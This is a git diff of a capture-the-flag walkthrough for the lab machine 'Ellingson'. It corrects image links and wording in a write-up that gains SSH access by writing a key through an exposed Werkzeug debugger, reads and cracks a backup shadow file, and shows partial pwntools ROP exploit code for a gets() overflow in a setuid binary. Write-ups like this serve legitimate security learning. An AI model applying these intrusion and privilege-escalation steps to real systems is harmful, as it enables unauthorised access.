@@ -23,9 +23,11 @@ duke
 
 ![usernames](https://github.com/roughiz/Ellingson-walktrough/blob/master/users.png)
 
-#### common passwords
-![passwords](https://github.com/roughiz/Ellingson-walktrough/blob/master/)
+#### Common passwords
+![passwords](https://github.com/roughiz/Ellingson-walktrough/blob/master/passwords.png)
+
 In http://10.10.10.139/articles/3 we have passwords :
+
 Love
 Secret 
 Sex
@@ -36,13 +38,16 @@ God
 Playing with the request, if we put an article id not in the range [0..3], we have an error page, and from it we can easily understand that the server use python flask web app framewok,and the debug is caught by "Werkzeug".
 Werkzeug is one of the most popular WSGI utility frameworks for Python. It simplifies the handling of HTTP connections within your Python application but also provides a powerful debugger that permits one to execute code from within the browser.
 With some research i found an [article](https://blog.keigher.ca/2014/12/remote-code-execution-on-misconfigured.html) about how to perform an RCE on misconfigured systems using Werkzeug. here the developer forgot to disable the debugger in production.
-![debbug](https://github.com/roughiz/Ellingson-walktrough/blob/master/)
+
+![debug](https://github.com/roughiz/Ellingson-walktrough/blob/master/debug.png)
 
 ## Caught ssh shell
-all my tests to perform an RCE from the debbug console fails, so i tried to list directories from the box to know if we have accees to a user home :
-![list_directories](https://github.com/roughiz/Ellingson-walktrough/blob/master/)
+All my tests to perform an RCE from the debbug console fails, so i tried to list directories from the box to know if we have accees to a user home :
+
+![list_directories](https://github.com/roughiz/Ellingson-walktrough/blob/master/listdir.png)
 
 The web app is running as "hal" user, and we can trought the debuger console, write in the "/home/hal/.ssh/authorized_keys" and add our key in the first stage. and use this key to authenticate with ssh.
+
 Firstly i create an ssh key (i don't want to put my own key in the box!!) :
 ``` 
 $ ssh-keygen
@@ -64,11 +69,12 @@ And finnaly use ssh to authenticate as hal like :
 ```
 ssh -v -i ./id_rsa hal@10.10.10.139
 ```
-![hal_shell](https://github.com/roughiz/Ellingson-walktrough/blob/master/)
+![hal_shell](https://github.com/roughiz/Ellingson-walktrough/blob/master/hal_shell.png)
 
 ## Privilege Escalation
 
 I didn't find the user.txt in the "hal" home directory, so i have to find how to authenticate as an other user to have my first flag, let's enumerate the box with my prefer linux priv escalation python [script](https://github.com/sleventyeleven/linuxprivchecker).
+
 First i transfer the script with scp like :
 ```
 $ scp -i ./ssh/id_rsa privsecchecker.py   hal@10.10.10.139:/tmp/ 
@@ -91,11 +97,12 @@ We have a strange setuid binary, but i can't execute it as hal user. let's try t
     -rwsr-xr-x 1 root root 18056 Mar  9 21:04 [/usr/bin/garbage]
 ```
 
-With some enumeration i found in "/var/backups" a shadow file with read right for group "adm", and the user hal belongs of this group. 
-![shadow_rights](https://github.com/roughiz/Ellingson-walktrough/blob/master/)
+With some enumeration i found in "/var/backups" a shadow.bak file with read right for group "adm", and the user hal belongs of this group. 
+
+![shadow_rights](https://github.com/roughiz/Ellingson-walktrough/blob/master/shadow.png)
 
 ##### Nota: 
-think to revert machine beforeexploit, some users change files rights !!!
+Think to revert machine before exploit, some users change files rights !!!
 ```
 $ cat shadow.bak
 ...
@@ -141,7 +148,7 @@ password123      (theplague)
 
 iamgod$08        (margo)
 
-The password for user "theplague" didn't work, but password of margo worked great and i have the user flag:
+The password for user "theplague" dosen't work, but password of margo worked great and i have the user flag:
 ```
 margo@ellingson:~$ cat user.txt | wc -c
 33
@@ -220,11 +227,11 @@ gdb-peda$ disassemble auth
    0x000000000040158a <+119>:	lea    rax,[rbp-0xf0]
 
 ```
-In the auth function, they use "gets" function which it's not safe to use, because it does not check the array bound.
+In the "auth" function, they use "gets" function which it's not safe to use, because it does not check the array bound.
 and we can also see that in the lines after they use "strcmp" to compare the user input [rbp-0x80] and the password hardcoded in [rip+0xbe1]
 
 #### Nota :
-in x86-64, to call a function, the  program should place the first six integer or pointer parameters in the registers %rdi, %rsi, %rdx, %rcx, %r8, and %r9; subsequent parameters (or parameters larger than
+In x86-64, to call a function, the  program should place the first six integer or pointer parameters in the registers %rdi, %rsi, %rdx, %rcx, %r8, and %r9; subsequent parameters (or parameters larger than
 64 bits) should be pushed onto the stack.
 and the register %rsp is used as the stack pointer, a pointer to the topmost element in the stack.
 
@@ -232,15 +239,20 @@ and the register %rsp is used as the stack pointer, a pointer to the topmost ele
 Here per example the binary compare the two strings like :
 ###### strcmp($rdi,$rsi)
 
+#### Segmentation Fault
+
+[SegFault](https://github.com/roughiz/Ellingson-walktrough/blob/master/segfault.png)
+
 Let's find how much caracters i need to have a segfault : 
-[]()
-[]()
-[]()
+
+![pattern](https://github.com/roughiz/Ellingson-walktrough/blob/master/pattern.png)
+![rsp](https://github.com/roughiz/Ellingson-walktrough/blob/master/rsp.png)
+![junk](https://github.com/roughiz/Ellingson-walktrough/blob/master/junk.png)
 
 #### Binary compiled flag
 Let's check how the binary was compiled and if ASLR is enabled in this box.
-i used the script [checksec](https://github.com/RobinDavid/checksec) to test executable properties like :
-[checksec_analyse](https://github.com/roughiz/Ellingson-walktrough/blob/master/)
+I used the script [checksec](https://github.com/RobinDavid/checksec) to test executable properties like :
+![checksec_analyse](https://github.com/roughiz/Ellingson-walktrough/blob/master/checksec.png)
 
 #### ASLR 
 ```
@@ -311,7 +323,7 @@ s = ssh(host='Ellingson.htb',user='margo',password='iamgod$08')
 p= s.process('/usr/bin/garbage')
 ````
 
-### Exploit code (manually)
+### Exploit [code](https://github.com/roughiz/Ellingson-walktrough/blob/master/exploit_manu.py) (manually)
 ```
 import struct, binascii
 from pwn import * 
@@ -376,7 +388,7 @@ p.recvuntil("denied.")
 p.interactive()
 ```
 
-### Exploit code (auto)
+### Exploit [code](https://github.com/roughiz/Ellingson-walktrough/blob/master/exploit_auto.py) (auto)
 We can also perform this attack using ROP and ELF Classes from pwntools, which search adress and also have some functions like "call" or "system" 
 
 ```
@@ -418,6 +430,9 @@ p.sendline(payload)
 p.recvuntil("denied.")
 p.interactive()
 ```
+
+## Root dance
+![root](https://github.com/roughiz/Ellingson-walktrough/blob/master/root.png)
 
 
 
